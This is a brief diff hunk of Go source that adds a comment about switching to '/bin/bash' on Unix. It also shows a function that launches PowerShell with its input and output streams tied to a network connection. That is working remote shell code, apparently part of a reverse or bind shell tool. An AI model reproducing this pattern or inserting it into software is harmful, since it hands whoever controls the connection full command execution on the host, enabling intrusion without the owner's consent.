@@ -7,6 +7,7 @@ import (
 	"time"
 )
 
+// change this to `/bin/bash` if you wish to use this on unix
 func runPowershell(conn net.Conn) {
 	cmd := exec.Command("powershell")
 	cmd.Stdin, cmd.Stdout, cmd.Stderr = conn, conn, conn
